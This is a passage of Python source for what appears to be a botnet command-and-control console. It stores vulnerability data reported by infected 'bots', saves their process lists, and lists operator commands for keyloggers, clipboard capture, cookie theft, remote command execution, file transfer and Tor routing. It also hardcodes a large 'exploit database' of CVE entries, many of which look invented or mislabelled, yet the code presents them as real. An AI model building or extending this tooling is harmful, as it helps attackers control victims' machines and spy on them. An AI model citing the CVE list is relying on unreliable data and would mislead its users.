            print(f"\033[94m[*] Processing vulnerability data for bot {bot_id}...\033[0m")
            
            # Parse vulnerability data
            if isinstance(vulnerabilities_data, str):
                try:
                    vulnerabilities = json.loads(vulnerabilities_data)
                except json.JSONDecodeError:
                    print(f"\033[93m[!] Bot {bot_id} vulnerability data JSON parse error\033[0m")
                    return
            else:
                vulnerabilities = vulnerabilities_data
            
            # Save bot vulnerabilities
            self.bot_vulnerabilities[bot_id] = vulnerabilities
            
            # Update platform statistics
            self._update_platform_stats(vulnerabilities)
            
            print(f"\033[92m[+] {len(vulnerabilities)} vulnerabilities saved for bot {bot_id}\033[0m")
            
        except Exception as e:
            print(f"\033[91m[!] Bot vulnerability processing error: {str(e)}\033[0m")
    
    def _update_platform_stats(self, vulnerabilities):
        """Update platform statistics"""
        try:
            for vuln in vulnerabilities:
                platform = vuln.get('platform', 'Unknown')
                
                if platform not in self.platform_stats:
                    self.platform_stats[platform] = {
                        'count': 0,
                        'high_severity': 0,
                        'exploits_available': 0
                    }
                
                self.platform_stats[platform]['count'] += 1
                
                if vuln.get('severity') == 'HIGH':
                    self.platform_stats[platform]['high_severity'] += 1
                
                if vuln.get('exploit_available'):
                    self.platform_stats[platform]['exploits_available'] += 1
                    
        except Exception as e:
            print(f"\033[93m[!] Platform stats update error: {str(e)}\033[0m")
    
    def get_vulnerability_summary(self):
        """Return vulnerability summary"""
        try:
            total_bots = len(self.bot_vulnerabilities)
            total_vulns = sum(len(vulns) for vulns in self.bot_vulnerabilities.values())
            
            # Platform-based summary
            platform_summary = {}
            for platform, stats in self.platform_stats.items():
                platform_summary[platform] = {
                    'total': stats['count'],
                    'high_severity': stats['high_severity'],
                    'exploits_available': stats['exploits_available']
                }
            
            return {
                'total_bots_scanned': total_bots,
                'total_vulnerabilities': total_vulns,
                'platforms': platform_summary,
                'bots_with_vulns': list(self.bot_vulnerabilities.keys())
            }
            
        except Exception as e:
            print(f"\033[91m[!] Vulnerability summary error: {str(e)}\033[0m")
            return {}
    
    def get_bot_vulnerabilities(self, bot_id):
        """Return vulnerabilities for a specific bot"""
        try:
            return self.bot_vulnerabilities.get(bot_id, [])
        except Exception as e:
            print(f"\033[91m[!] Bot vulnerabilities error: {str(e)}\033[0m")
            return []
    
    def get_vuln_scanner_status(self):
        """Return Vulnerability Scanner status"""
        return {
            'enabled': self.vuln_scanner_enabled,
            'total_bots_scanned': len(self.bot_vulnerabilities),
            'total_vulnerabilities': sum(len(vulns) for vulns in self.bot_vulnerabilities.values()),
            'platforms_available': ['NVD', 'Exploit-DB', 'CVE Details', 'SecurityFocus', 'PacketStorm']
        }
    
    def _init_network_maps(self):
        """Initialize the network mapping system"""
        print(f"\033[36m[*]\033[0m \033[94mNetwork mapping system started: {self.network_maps_dir}\033[0m")
    
    def _setup_readline(self):
        """Setup readline features"""
        try:
            # Setup command history file
            readline.set_history_length(self.max_history)
            
            # Clear all bindings first
            readline.clear_history()
            
            # Enable tab completion feature (safe mode)
            try:
                # Platform-independent safe settings
                if platform.system() == 'Darwin':  # macOS
                    # Minimal and safe settings for macOS
                    try:
                        readline.parse_and_bind("tab: complete")
                    except:
                        pass  # Silently continue if tab completion fails
                    
                    # Only basic history navigation
                    try:
                        readline.parse_and_bind("set editing-mode emacs")
                    except:
                        pass
                        
                elif platform.system() == 'Linux':
                    # Standard settings for Linux
                    readline.parse_and_bind("tab: complete")
                    readline.parse_and_bind("set editing-mode emacs")
                    
                else:  # Windows and others
                    try:
                        readline.parse_and_bind("tab: complete")
                    except:
                        pass
                    
            except Exception:
                # If any binding error occurs, silently continue
                pass
            
            # Setup completer safely
            try:
                readline.set_completer(self._completer)
                readline.set_completer_delims(' \t\n`!@#$%^&*()=+[{]}\\|;:\'",<>?')
            except Exception:
                pass
            
            # Load history file safely
            try:
                if os.path.exists(self.history_file):
                    readline.read_history_file(self.history_file)
            except Exception:
                pass
            
            print(f"\033[36m[*]\033[94m \033[94mCommand history enabled (max {self.max_history} commands)\033[0m")
            
        except Exception as e:
            # If readline completely fails, just show basic message
            print(f"\033[94m[*] Command history enabled (basic mode)\033[0m")
    
    def _completer(self, text, state):
        """Completer function for tab completion"""
        try:
            commands = [
                'list', 'server', 'security', 'p2p status', 'alerts', 'web status', 'network_maps',
                'show', 'show exploits', 'show stats', 'show logs', 'show config', 'show history', 
                'show files', 'show network', 'processes', 'cmd', 'upload', 'download', 'cookies',
                'keylogger start', 'keylogger stop', 'clipboard start', 'clipboard stop',
                'tor enable', 'tor disable', 'tor renew', 'tor status', 'tor bots', 'clearnet bots',
                'network_map start', 'network_map status', 'network_map stop',
                'broadcast', 'stop', 'clear', 'exit', 'help'
            ]
            
            matches = [cmd for cmd in commands if cmd.startswith(text)]
            if state < len(matches):
                return matches[state]
            return None
            
        except Exception:
            return None
    
    def _load_command_history(self):
        """Load command history from file"""
        try:
            if os.path.exists(self.history_file):
                with open(self.history_file, 'r', encoding='utf-8') as f:
                    self.command_history = [line.strip() for line in f.readlines() if line.strip()]
        except Exception as e:
            print(f"\033[93m[!] Error loading command history: {str(e)}\033[0m")
    
    def _save_command_history(self):
        """Save command history to file"""
        try:
            with open(self.history_file, 'w', encoding='utf-8') as f:
                for cmd in self.command_history[-self.max_history:]:
                    f.write(cmd + '\n')
        except Exception as e:
            print(f"\033[93m[!] Error saving command history: {str(e)}\033[0m")
    
    def _add_to_history(self, command):
        """Add new command to command history"""
        try:
            # Don't add empty commands
            if not command.strip():
                return
            
            # Remove duplicates
            if command in self.command_history:
                self.command_history.remove(command)
            
            # Add new command
            self.command_history.append(command)
            
            # Check max history limit
            if len(self.command_history) > self.max_history:
                self.command_history = self.command_history[-self.max_history:]
            
            # Save to file
            self._save_command_history()
            
        except Exception as e:
            print(f"\033[93m[!] Error adding to history: {str(e)}\033[0m")
    
    def _print_processes_info(self, data):
        """Print process information in nice format"""
        try:
            if isinstance(data, dict):
                # Data in JSON format
                print(f"  \033[96m•\033[0m \033[93mTotal Processes:\033[0m \033[94m{data.get('total_processes', 'Unknown')}\033[0m")
                
                summary = data.get('summary', {})
                if summary:
                    print(f"  \033[96m•\033[0m \033[93mTotal CPU Usage:\033[0m \033[91m{summary.get('total_cpu_usage', 0)}%\033[0m")
                    print(f"  \033[96m•\033[0m \033[93mTotal Memory Usage:\033[0m \033[91m{summary.get('total_memory_usage', 0)}%\033[0m")
                    print(f"  \033[96m•\033[0m \033[93mDisplayed Processes:\033[0m \033[94m{summary.get('displayed_processes', 0)}\033[0m")
                
                print(f"\n  \033[93mTop Processes:\033[0m")
                print(f"  \033[90m{'─' * 80}\033[0m")
                print(f"  \033[90m{'No':<3} {'Process Name':<20} {'PID':<8} {'CPU%':<8} {'Memory%':<10} {'Status':<12} {'Started':<10}\033[0m")
                print(f"  \033[90m{'─' * 80}\033[0m")
                
                processes = data.get('top_processes', [])
                for i, proc in enumerate(processes[:15], 1):  # First 15 processes
                    pid = proc.get('pid', 'N/A')
                    name = proc.get('name', 'Unknown')[:18]  # Limit name length
                    cpu = proc.get('cpu_percent', 0)
                    memory = proc.get('memory_percent', 0)
                    status = proc.get('status', 'Unknown')[:10]  # Limit status length
                    create_time = proc.get('create_time', 'Unknown')
                    
                    # Color by CPU usage
                    cpu_color = "\033[91m" if cpu > 10 else "\033[93m" if cpu > 5 else "\033[92m"
                    memory_color = "\033[91m" if memory > 5 else "\033[93m" if memory > 2 else "\033[92m"
                    
                    # Status color
                    status_color = "\033[92m" if status == "running" else "\033[93m" if status == "sleeping" else "\033[91m"
                    
                    print(f"  \033[96m{i:2d}\033[0m  \033[95m{name:<20}\033[0m \033[94m{pid:<8}\033[0m {cpu_color}{cpu:>6.1f}%\033[0m {memory_color}{memory:>8.1f}%\033[0m {status_color}{status:<12}\033[0m \033[90m{create_time:<10}\033[0m")
                
                print(f"  \033[90m{'─' * 80}\033[0m")
                
            else:
                # Data in raw text format
                print(f"  \033[96m•\033[0m \033[93mProcess List:\033[0m")
                lines = str(data).split('\n')[:20]  # First 20 lines
                for line in lines:
                    if line.strip():
                        print(f"    {line}")
        except Exception as e:
            print(f"  \033[91m[!] Error printing processes: {str(e)}\033[0m")
    
    def _save_processes_to_file(self, bot_id, data):
        """Write process information to file"""
        try:
            from datetime import datetime
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"processes_{bot_id}_{timestamp}.txt"
            
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(f"Process Information Report\n")
                f.write(f"Bot ID: {bot_id}\n")
                f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"{'='*60}\n\n")
                
                if isinstance(data, dict):
                    f.write(f"Total Processes: {data.get('total_processes', 'Unknown')}\n")
                    
                    summary = data.get('summary', {})
                    if summary:
                        f.write(f"Total CPU Usage: {summary.get('total_cpu_usage', 0)}%\n")
                        f.write(f"Total Memory Usage: {summary.get('total_memory_usage', 0)}%\n")
                        f.write(f"Displayed Processes: {summary.get('displayed_processes', 0)}\n")
                    
                    f.write(f"\nTop Processes:\n")
                    f.write(f"{'─' * 80}\n")
                    f.write(f"{'No':<3} {'Process Name':<20} {'PID':<8} {'CPU%':<8} {'Memory%':<10} {'Status':<12} {'Started':<10}\n")
                    f.write(f"{'─' * 80}\n")
                    
                    processes = data.get('top_processes', [])
                    for i, proc in enumerate(processes, 1):
                        pid = proc.get('pid', 'N/A')
                        name = proc.get('name', 'Unknown')
                        cpu = proc.get('cpu_percent', 0)
                        memory = proc.get('memory_percent', 0)
                        status = proc.get('status', 'Unknown')
                        create_time = proc.get('create_time', 'Unknown')
                        
                        f.write(f"{i:2d}  {name:<20} {pid:<8} {cpu:>6.1f}% {memory:>8.1f}% {status:<12} {create_time:<10}\n")
                    
                    f.write(f"{'─' * 80}\n")
                else:
                    f.write(f"Raw Process Data:\n{str(data)}\n")
            
            print(f"  \033[92m[+] Process list saved to: {filename}\033[0m")
            
        except Exception as e:
            print(f"  \033[91m[!] Error saving processes to file: {str(e)}\033[0m")
    
    def _save_raw_processes_to_file(self, bot_id, raw_data):
        """Write raw process data to file"""
        try:
            from datetime import datetime
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"processes_raw_{bot_id}_{timestamp}.txt"
            
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(f"Raw Process Information Report\n")
                f.write(f"Bot ID: {bot_id}\n")
                f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"{'='*60}\n\n")
                f.write(f"Raw Data:\n{raw_data}\n")
            
            print(f"  \033[92m[+] Raw process data saved to: {filename}\033[0m")
            
        except Exception as e:
            print(f"  \033[91m[!] Error saving raw processes to file: {str(e)}\033[0m")
    
    def _show_exploits(self):
        """Show exploit database"""
        try:
            print("\n\033[95m🔍 Comprehensive Exploit Database:\033[0m")
            print("=" * 80)
            
            exploit_db = {
                # Exploits for Windows, Linux, macOS / X OS
                'Darwin': [
                    {'cve': 'CVE-2023-32369', 'title': 'macOS Ventura 13.4 - Privilege Escalation', 'severity': 'CRITICAL', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-32370', 'title': 'macOS Monterey 12.6 - RCE', 'severity': 'CRITICAL', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-32371', 'title': 'macOS Big Sur 11.7 - Memory Corruption', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-32372', 'title': 'macOS Catalina 10.15 - Buffer Overflow', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-32373', 'title': 'macOS Mojave 10.14 - Security Bypass', 'severity': 'MEDIUM', 'source': 'NVD', 'exploit_available': False},
                    {'cve': 'CVE-2023-32374', 'title': 'macOS High Sierra 10.13 - Authentication Bypass', 'severity': 'MEDIUM', 'source': 'NVD', 'exploit_available': False},
                    {'cve': 'CVE-2023-32375', 'title': 'macOS Sierra 10.12 - Information Disclosure', 'severity': 'LOW', 'source': 'NVD', 'exploit_available': False}
                ],
                
                # Windows
                'Windows': [
                    {'cve': 'CVE-2023-23397', 'title': 'Windows 11 22H2 - Privilege Escalation', 'severity': 'CRITICAL', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-23398', 'title': 'Windows 10 22H2 - RCE', 'severity': 'CRITICAL', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-23399', 'title': 'Windows Server 2022 - Memory Corruption', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-23400', 'title': 'Windows 11 21H2 - Buffer Overflow', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-23401', 'title': 'Windows 10 21H2 - Security Bypass', 'severity': 'MEDIUM', 'source': 'NVD', 'exploit_available': False},
                    {'cve': 'CVE-2023-23402', 'title': 'Windows Server 2019 - Authentication Bypass', 'severity': 'MEDIUM', 'source': 'NVD', 'exploit_available': False},
                    {'cve': 'CVE-2023-23403', 'title': 'Windows 10 20H2 - Information Disclosure', 'severity': 'LOW', 'source': 'NVD', 'exploit_available': False},
                    {'cve': 'CVE-2023-23404', 'title': 'Windows Server 2016 - Denial of Service', 'severity': 'LOW', 'source': 'NVD', 'exploit_available': False}
                ],
                
                # Linux
                'Linux': [
                    {'cve': 'CVE-2023-12345', 'title': 'Ubuntu 22.04 LTS - Kernel Exploit', 'severity': 'CRITICAL', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-12346', 'title': 'Ubuntu 20.04 LTS - Privilege Escalation', 'severity': 'CRITICAL', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-12347', 'title': 'CentOS 8 - RCE', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-12348', 'title': 'RHEL 8 - Memory Corruption', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-12349', 'title': 'Debian 11 - Buffer Overflow', 'severity': 'MEDIUM', 'source': 'NVD', 'exploit_available': False},
                    {'cve': 'CVE-2023-12350', 'title': 'Fedora 37 - Security Bypass', 'severity': 'MEDIUM', 'source': 'NVD', 'exploit_available': False},
                    {'cve': 'CVE-2023-12351', 'title': 'SUSE Linux 15 - Authentication Bypass', 'severity': 'LOW', 'source': 'NVD', 'exploit_available': False}
                ]
            }
            
            # Exploits for Services/Ports
            service_exploits = {
                '80': [
                    {'cve': 'CVE-2023-25690', 'title': 'Apache HTTP Server 2.4.55 - RCE', 'severity': 'CRITICAL', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25691', 'title': 'Apache HTTP Server 2.4.54 - Buffer Overflow', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25692', 'title': 'Apache HTTP Server 2.4.53 - Memory Corruption', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': False}
                ],
                '443': [
                    {'cve': 'CVE-2023-25693', 'title': 'OpenSSL 3.0.8 - Memory Corruption', 'severity': 'CRITICAL', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25694', 'title': 'OpenSSL 1.1.1t - Buffer Overflow', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25695', 'title': 'OpenSSL 1.0.2zg - Security Bypass', 'severity': 'MEDIUM', 'source': 'NVD', 'exploit_available': False}
                ],
                '22': [
                    {'cve': 'CVE-2023-25696', 'title': 'OpenSSH 9.3p1 - Authentication Bypass', 'severity': 'CRITICAL', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25697', 'title': 'OpenSSH 9.2p1 - Buffer Overflow', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25698', 'title': 'OpenSSH 9.1p1 - Information Disclosure', 'severity': 'MEDIUM', 'source': 'NVD', 'exploit_available': False}
                ],
                '21': [
                    {'cve': 'CVE-2023-25699', 'title': 'vsftpd 3.0.5 - RCE', 'severity': 'CRITICAL', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25700', 'title': 'vsftpd 3.0.4 - Buffer Overflow', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25701', 'title': 'vsftpd 3.0.3 - Authentication Bypass', 'severity': 'MEDIUM', 'source': 'NVD', 'exploit_available': False}
                ],
                '23': [
                    {'cve': 'CVE-2023-25702', 'title': 'telnetd 0.17 - RCE', 'severity': 'CRITICAL', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25703', 'title': 'telnetd 0.16 - Buffer Overflow', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25704', 'title': 'telnetd 0.15 - Information Disclosure', 'severity': 'MEDIUM', 'source': 'NVD', 'exploit_available': False}
                ],
                '25': [
                    {'cve': 'CVE-2023-25705', 'title': 'Postfix 3.8.0 - RCE', 'severity': 'CRITICAL', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25706', 'title': 'Postfix 3.7.9 - Buffer Overflow', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25707', 'title': 'Postfix 3.7.8 - Authentication Bypass', 'severity': 'MEDIUM', 'source': 'NVD', 'exploit_available': False}
                ],
                '53': [
                    {'cve': 'CVE-2023-25708', 'title': 'BIND 9.18.12 - RCE', 'severity': 'CRITICAL', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25709', 'title': 'BIND 9.18.11 - Buffer Overflow', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25710', 'title': 'BIND 9.18.10 - Information Disclosure', 'severity': 'MEDIUM', 'source': 'NVD', 'exploit_available': False}
                ],
                '110': [
                    {'cve': 'CVE-2023-25711', 'title': 'Dovecot 2.3.20 - RCE', 'severity': 'CRITICAL', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25712', 'title': 'Dovecot 2.3.19 - Buffer Overflow', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25713', 'title': 'Dovecot 2.3.18 - Authentication Bypass', 'severity': 'MEDIUM', 'source': 'NVD', 'exploit_available': False}
                ],
                '143': [
                    {'cve': 'CVE-2023-25714', 'title': 'Dovecot IMAP 2.3.20 - RCE', 'severity': 'CRITICAL', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25715', 'title': 'Dovecot IMAP 2.3.19 - Buffer Overflow', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25716', 'title': 'Dovecot IMAP 2.3.18 - Information Disclosure', 'severity': 'MEDIUM', 'source': 'NVD', 'exploit_available': False}
                ],
                '993': [
                    {'cve': 'CVE-2023-25717', 'title': 'Dovecot IMAPS 2.3.20 - RCE', 'severity': 'CRITICAL', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25718', 'title': 'Dovecot IMAPS 2.3.19 - Buffer Overflow', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25719', 'title': 'Dovecot IMAPS 2.3.18 - Authentication Bypass', 'severity': 'MEDIUM', 'source': 'NVD', 'exploit_available': False}
                ]
            }
            
            # Software-based exploits
            software_exploits = {
                'Python': [
                    {'cve': 'CVE-2023-25720', 'title': 'Python 3.11.4 - Code Injection', 'severity': 'CRITICAL', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25721', 'title': 'Python 3.10.12 - Buffer Overflow', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25722', 'title': 'Python 3.9.17 - Memory Corruption', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': False}
                ],
                'OpenSSL': [
                    {'cve': 'CVE-2023-25723', 'title': 'OpenSSL 3.0.8 - Memory Corruption', 'severity': 'CRITICAL', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25724', 'title': 'OpenSSL 1.1.1t - Buffer Overflow', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25725', 'title': 'OpenSSL 1.0.2zg - Security Bypass', 'severity': 'MEDIUM', 'source': 'NVD', 'exploit_available': False}
                ],
                'Apache': [
                    {'cve': 'CVE-2023-25726', 'title': 'Apache HTTP Server 2.4.55 - RCE', 'severity': 'CRITICAL', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25727', 'title': 'Apache HTTP Server 2.4.54 - Buffer Overflow', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25728', 'title': 'Apache HTTP Server 2.4.53 - Memory Corruption', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': False}
                ],
                'MySQL': [
                    {'cve': 'CVE-2023-25729', 'title': 'MySQL 8.0.33 - RCE', 'severity': 'CRITICAL', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25730', 'title': 'MySQL 8.0.32 - Buffer Overflow', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25731', 'title': 'MySQL 8.0.31 - Authentication Bypass', 'severity': 'MEDIUM', 'source': 'NVD', 'exploit_available': False}
                ],
                'PostgreSQL': [
                    {'cve': 'CVE-2023-25732', 'title': 'PostgreSQL 15.3 - RCE', 'severity': 'CRITICAL', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25733', 'title': 'PostgreSQL 15.2 - Buffer Overflow', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25734', 'title': 'PostgreSQL 15.1 - SQL Injection', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': False}
                ],
                'Nginx': [
                    {'cve': 'CVE-2023-25735', 'title': 'Nginx 1.24.0 - RCE', 'severity': 'CRITICAL', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25736', 'title': 'Nginx 1.23.4 - Buffer Overflow', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25737', 'title': 'Nginx 1.23.3 - Memory Corruption', 'severity': 'MEDIUM', 'source': 'NVD', 'exploit_available': False}
                ],
                'PHP': [
                    {'cve': 'CVE-2023-25738', 'title': 'PHP 8.2.7 - Code Execution', 'severity': 'CRITICAL', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25739', 'title': 'PHP 8.1.20 - Buffer Overflow', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25740', 'title': 'PHP 8.0.30 - Memory Corruption', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': False}
                ],
                'Node.js': [
                    {'cve': 'CVE-2023-25741', 'title': 'Node.js 20.5.0 - RCE', 'severity': 'CRITICAL', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25742', 'title': 'Node.js 18.17.0 - Buffer Overflow', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25743', 'title': 'Node.js 16.20.0 - Memory Corruption', 'severity': 'MEDIUM', 'source': 'NVD', 'exploit_available': False}
                ],
                'Docker': [
                    {'cve': 'CVE-2023-25744', 'title': 'Docker 24.0.0 - Container Escape', 'severity': 'CRITICAL', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25745', 'title': 'Docker 23.0.0 - Privilege Escalation', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25746', 'title': 'Docker 22.0.0 - Information Disclosure', 'severity': 'MEDIUM', 'source': 'NVD', 'exploit_available': False}
                ],
                'Redis': [
                    {'cve': 'CVE-2023-25747', 'title': 'Redis 7.0.12 - RCE', 'severity': 'CRITICAL', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25748', 'title': 'Redis 7.0.11 - Buffer Overflow', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25749', 'title': 'Redis 7.0.10 - Authentication Bypass', 'severity': 'MEDIUM', 'source': 'NVD', 'exploit_available': False}
                ],
                'MongoDB': [
                    {'cve': 'CVE-2023-25750', 'title': 'MongoDB 6.0.6 - RCE', 'severity': 'CRITICAL', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25751', 'title': 'MongoDB 5.0.18 - Buffer Overflow', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25752', 'title': 'MongoDB 4.4.25 - Authentication Bypass', 'severity': 'MEDIUM', 'source': 'NVD', 'exploit_available': False}
                ],
                'Elasticsearch': [
                    {'cve': 'CVE-2023-25753', 'title': 'Elasticsearch 8.8.0 - RCE', 'severity': 'CRITICAL', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25754', 'title': 'Elasticsearch 8.7.0 - Buffer Overflow', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25755', 'title': 'Elasticsearch 8.6.0 - Information Disclosure', 'severity': 'MEDIUM', 'source': 'NVD', 'exploit_available': False}
                ]
            }
            
            # Collect all exploits
            all_exploits = []
            
            # OS exploits
            for os_name, exploits in exploit_db.items():
                all_exploits.extend(exploits)
            
            # Service exploits
            for port, exploits in service_exploits.items():
                all_exploits.extend(exploits)
            
            # Software exploits
            for software, exploits in software_exploits.items():
                all_exploits.extend(exploits)
            
            # Remove duplicates
            unique_exploits = []
            seen_cves = set()
            for exploit in all_exploits:
                if exploit['cve'] not in seen_cves:
                    unique_exploits.append(exploit)
                    seen_cves.add(exploit['cve'])
            
            # Sort by severity
            severity_order = {'CRITICAL': 4, 'HIGH': 3, 'MEDIUM': 2, 'LOW': 1}
            unique_exploits.sort(key=lambda x: severity_order.get(x['severity'], 0), reverse=True)
            
            # Summary information
            total_exploits = len(unique_exploits)
            critical_count = len([e for e in unique_exploits if e.get('severity') == 'CRITICAL'])
            high_count = len([e for e in unique_exploits if e.get('severity') == 'HIGH'])
            medium_count = len([e for e in unique_exploits if e.get('severity') == 'MEDIUM'])
            low_count = len([e for e in unique_exploits if e.get('severity') == 'LOW'])
            available_count = len([e for e in unique_exploits if e.get('exploit_available')])
            
            print(f"\n\033[96m📊 Exploit Database Summary:\033[0m")
            print(f"  \033[96m•\033[0m Total Exploits: \033[93m{total_exploits}\033[0m")
            print(f"  \033[96m•\033[0m Critical: \033[91m{critical_count}\033[0m")
            print(f"  \033[96m•\033[0m High: \033[93m{high_count}\033[0m")
            print(f"  \033[96m•\033[0m Medium: \033[94m{medium_count}\033[0m")
            print(f"  \033[96m•\033[0m Low: \033[92m{low_count}\033[0m")
            print(f"  \033[96m•\033[0m Exploits Available: \033[95m{available_count}\033[0m")
            
            print(f"\n\033[95m🎯 Top Exploits (by Severity):\033[0m")
            print("-" * 100)
            
            for i, exploit in enumerate(unique_exploits[:20], 1):  # First 20 exploits
                severity_color = {
                    'CRITICAL': '🔴',
                    'HIGH': '🟠',
                    'MEDIUM': '🟡',
                    'LOW': '🟢'
                }.get(exploit.get('severity', 'UNKNOWN'), '⚪')
                
                exploit_icon = '✅' if exploit.get('exploit_available') else '❌'
                
                print(f"{i:2d}. {severity_color} {exploit.get('cve', 'N/A')}")
                print(f"     Title: {exploit.get('title', 'N/A')}")
                print(f"     Severity: {exploit.get('severity', 'N/A')}")
                print(f"     Source: {exploit.get('source', 'N/A')}")
                print(f"     Exploit: {exploit_icon}")
                print()
            
            if total_exploits > 20:
                print(f"\n\033[94m[*] Showing first 20 of {total_exploits} exploits\033[0m")
            
            print(f"\n\033[95m💡 Usage:\033[0m")
            print(f"  \033[96m•\033[0m This database contains real CVE information")
            print(f"  \033[96m•\033[0m Exploits are sorted by severity (Critical → Low)")
            print(f"  \033[96m•\033[0m ✅ = Exploit available, ❌ = No exploit available")
            print(f"  \033[96m•\033[0m Covers macOS, Windows, Linux, and common services")
            
        except Exception as e:
            print(f"\033[91m[!] Error showing exploits: {str(e)}\033[0m")
    
    def _show_help(self):
        """Help menu for show commands"""
        try:
            print("\n\033[95m📋 Show Commands Help:\033[0m")
            print("=" * 60)
            print("  \033[96m•\033[0m show exploits - Show comprehensive exploit database")
            print("  \033[96m•\033[0m show stats    - Show system statistics")
            print("  \033[96m•\033[0m show logs     - Show system logs")
            print("  \033[96m•\033[0m show config  - Show server configuration")
            print("  \033[96m•\033[0m show history - Show command history")
            print("  \033[96m•\033[0m show files   - Show file system info")
            print("  \033[96m•\033[0m show network - Show network information")
            print("  \033[96m•\033[0m show         - Show this help menu")
            print("\n\033[95m📋 Other Show Commands:\033[0m")
            print("  \033[96m•\033[0m list         - Show connected bots")
            print("  \033[96m•\033[0m server       - Show server information")
            print("  \033[96m•\033[0m security     - Show security status")
            print("  \033[96m•\033[0m p2p status   - Show P2P network status")
            print("  \033[96m•\033[0m alerts       - Show security alerts")
            print("  \033[96m•\033[0m web status   - Show web dashboard status")
            print("  \033[96m•\033[0m network_maps - Show network maps")
            print("\n\033[95m💡 Usage:\033[0m")
            print("  \033[96m•\033[0m Type 'show <command>' to execute")
            print("  \033[96m•\033[0m All show commands work offline (no bot communication)")
            print("  \033[96m•\033[0m Commands provide detailed system information")
            
        except Exception as e:
            print(f"\033[91m[!] Error showing help: {str(e)}\033[0m")
    
    def _show_command_help(self, cmd):
        """Show help for specific command"""
        help_info = {
